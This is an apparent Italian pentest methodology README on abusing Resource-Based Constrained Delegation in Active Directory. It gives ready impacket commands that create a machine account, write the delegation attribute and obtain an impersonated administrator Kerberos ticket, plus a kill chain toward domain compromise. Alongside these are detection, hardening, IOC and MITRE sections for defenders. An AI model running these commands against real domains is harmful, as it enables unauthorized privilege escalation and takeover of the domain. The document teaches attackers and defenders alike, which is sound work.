> [English](README.en.md) | **Italiano**

# Resource-Based constrained delegation (RBCD) abuse

> - **Fase:** Privilege Escalation / Lateral Movement (dominio Active Directory)
> - **Visibilita:** Media - richiede la scrittura di un attributo su un oggetto computer (modifica AD) e richieste S4U al KDC
> - **Prerequisiti:** diritto di scrittura sull'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` dell'oggetto computer bersaglio (es. GenericWrite/GenericAll sul computer); la possibilita di controllare un account con SPN (o di crearne uno sfruttando il MachineAccountQuota)
> - **Tecnica:** `RBCD abuse` | **Severity tipica:** `Critico` | **Finding ID:** da assegnare in lab (metodologia)

- Natura del documento: metodologia. Output illustrativi; identificativi segnaposto.
- Obiettivo: ottenere l'esecuzione come amministratore locale (o come qualunque utente) su un computer bersaglio, abusando della delega vincolata basata sulle risorse.

---

## Executive summary

La Resource-Based Constrained Delegation (RBCD) sposta la decisione sulla delega dal lato del servizio
mittente a quello della risorsa bersaglio: un computer specifica, nell'attributo
`msDS-AllowedToActOnBehalfOfOtherIdentity`, quali account possono impersonare altri utenti verso di esso.
L'abuso: se l'attaccante puo scrivere quell'attributo sul computer bersaglio (diritto spesso rivelato da
BloodHound come GenericWrite/GenericAll), vi inserisce un account che controlla; poi, tramite le estensioni
S4U di Kerberos (S4U2self + S4U2proxy), ottiene un ticket di servizio per il bersaglio impersonando un
amministratore. Il risultato e l'esecuzione privilegiata sul computer.

Spesso l'account "controllato" da inserire si crea sfruttando il MachineAccountQuota (per default, ogni
utente di dominio puo creare fino a 10 account computer), che fornisce un account con SPN pronto all'uso.

## Contesto operativo (perche, prima del come)

RBCD e uno dei percorsi piu comuni che BloodHound segnala, perche il diritto di scrittura su un oggetto
computer e frequente (deleghe amministrative, gruppi di gestione). La decisione operativa e duplice: quale
account usare come "impersonatore" (uno gia controllato con SPN, oppure uno nuovo creato via
MachineAccountQuota) e quale utente privilegiato impersonare verso il bersaglio (tipicamente un admin
locale o di dominio).

## Esecuzione / comandi

### Fase 1 - preparare un account con SPN (se necessario)

```bash
# Crea un account computer sfruttando il MachineAccountQuota (se > 0); fornisce un SPN controllato
addcomputer.py corp.local/utente:'Password123' -dc-ip 10.10.10.10 \
  -computer-name 'EVIL$' -computer-pass 'EvilPass123'
```

### Fase 2 - scrivere la delega sul bersaglio

```bash
# Imposta msDS-AllowedToActOnBehalfOfOtherIdentity sul computer bersaglio, delegando a EVIL$
rbcd.py corp.local/utente:'Password123' -dc-ip 10.10.10.10 -action write \
  -delegate-from 'EVIL$' -delegate-to 'TARGET$'
```

### Fase 3 - impersonazione via S4U

```bash
# Richiede un TGS per il servizio del bersaglio impersonando 'administrator' (S4U2self + S4U2proxy)
getST.py corp.local/'EVIL$':'EvilPass123' -dc-ip 10.10.10.10 \
  -spn 'cifs/target.corp.local' -impersonate administrator
```

Output illustrativo (rappresentativo):

```
[*] Impersonating administrator
[*] Saving ticket in administrator@cifs_target.corp.local.ccache   <-- accesso admin al bersaglio
```

## Analisi dei risultati

Il risultato e l'accesso privilegiato (tipicamente admin locale) al computer bersaglio, da cui si procede a
dump di credenziali e lateral movement. La severity e `Critico` quando il bersaglio e un sistema ad alto
valore (o quando la catena, ripetuta, raggiunge un DC). RBCD e particolarmente insidioso perche sfrutta una
funzionalita progettata per scenari legittimi di delega.

### Analisi teorica

Le estensioni S4U (Service for User) permettono a un servizio di ottenere ticket per conto di un utente:
S4U2self ottiene un ticket verso se stesso a nome dell'utente, S4U2proxy lo "inoltra" verso un altro
servizio. RBCD definisce, lato risorsa, chi e autorizzato a questo inoltro. La violazione (proprieta P3,
confinamento dell'autorita) nasce quando il diritto di scrivere l'attributo di delega finisce a un principal
non fidato: l'attaccante si auto-autorizza a impersonare chiunque verso il bersaglio. La crittografia
Kerberos funziona correttamente; il problema e l'ACL che permette la scrittura dell'attributo. Vedi
[THEORETICAL-FOUNDATIONS](<../../THEORETICAL-FOUNDATIONS.md>).

## Remediation (blue team)

**Rilevamento.** Modifiche all'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` (Event ID 5136 su
oggetti computer); creazione di account computer da utenti standard (sfruttamento MachineAccountQuota);
richieste S4U anomale.

**Hardening.** Portare `MachineAccountQuota` a 0 (gli utenti non devono poter creare account computer);
restringere i diritti di scrittura sugli oggetti computer; monitorare le modifiche agli attributi di
delega; usare Protected Users e account sensibili marcati come non delegabili.

---

## Scenario reale: proiezione Post-Exploitation

> RBCD porta a compromissione di host e, concatenato, del dominio (severity Critico).

### Prospettiva attaccante (red team)

**Punto di partenza:** diritto di scrittura su un oggetto computer (da BloodHound) e un account di dominio.

**Passo successivo immediato:** creare/usare un account con SPN, scrivere la delega sul bersaglio,
impersonare un admin via S4U.

**Kill Chain proiettata:**

```
GenericWrite su un computer (da BloodHound)
        |
        v
MachineAccountQuota -> account EVIL$ con SPN
        |
        v
Scrittura msDS-AllowedToActOnBehalfOfOtherIdentity -> S4U -> TGS admin verso il bersaglio
        |
        v
Admin locale sul computer -> dump credenziali -> lateral movement
        |
        v
Ripetizione verso un DC o DCSync -> dominio completo
```

**Impatto potenziale:** da un singolo diritto di scrittura all'amministrazione di host chiave e, a cascata,
del dominio.

**Vettori di monetizzazione tipici:** ransomware/esfiltrazione a valle del dominio; access brokering.

### Prospettiva difensore (blue team)

**Rilevamento:** Event ID 5136 su attributi di delega; creazione di account computer da utenti standard;
S4U inattesi.

**Indicatori di Compromissione (IOC):** comparsa di nuovi account computer con SPN creati da utenti;
modifica di `msDS-AllowedToActOnBehalfOfOtherIdentity`; ticket di impersonazione verso host sensibili.

**Contenimento:** rimozione dell'attributo di delega abusato; disabilitazione dell'account computer
malevolo; indagine sugli accessi al bersaglio.

**Eradicazione e hardening:** MachineAccountQuota a 0; revisione dei diritti di scrittura sugli oggetti
computer; monitoraggio continuo delle modifiche di delega.

**Lezione difensiva:** un diritto di scrittura apparentemente innocuo su un oggetto computer puo valere
l'amministrazione di quel computer. La difesa e la revisione rigorosa delle ACL (che BloodHound rende
evidenti) e l'azzeramento del MachineAccountQuota.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `rbcd.py` (impacket) | ad tool | cli - attivo | scrittura/lettura dell'attributo di delega rbcd |
| `addcomputer.py` (impacket) | ad tool | cli - attivo | creazione account computer via machineaccountquota |
| `getST.py` (impacket) | kerberos tool | cli - attivo | richiesta ticket s4u con impersonazione |
| `Rubeus` | .net kerberos tool | cli - attivo | s4u e rbcd da host windows |
| `BloodHound` | graph enum | gui | individuazione del diritto di scrittura sull'oggetto computer |

## Note di metodologia

In lab reale documentare: il diritto sfruttato (da BloodHound), il valore di MachineAccountQuota, la
scrittura dell'attributo e l'esito dell'impersonazione S4U. Verificare la contromisura MachineAccountQuota=0.

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| persistence | account manipulation | `T1098` | scrittura dell'attributo di delega rbcd sull'oggetto computer bersaglio. |
| lateral movement | use alternate authentication material: pass the ticket | `T1550.003` | uso del ticket s4u per accedere al bersaglio come amministratore. |
| credential access | steal or forge kerberos tickets | `T1558` | ottenimento di ticket di impersonazione via s4u. |

## Correlazioni con altri moduli

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [bloodhound](<../../01-enumeration/bloodhound/README.md>) | rbcd | individua il diritto di scrittura sul computer |
| rbcd | [07-post-exploitation - credential dumping](<../../../07-post-exploitation/README.md>) | l'accesso admin all'host abilita il dump delle credenziali |
| rbcd | [dcsync](<../../05-credential-dumping/dcsync/README.md>) | la catena ripetuta verso un dc porta alla replica abusata |

---

> **Nota:** Contenuto didattico e di metodologia. Esecuzione solo in laboratori propri o con autorizzazione esplicita. Output illustrativi, non da sistemi reali.
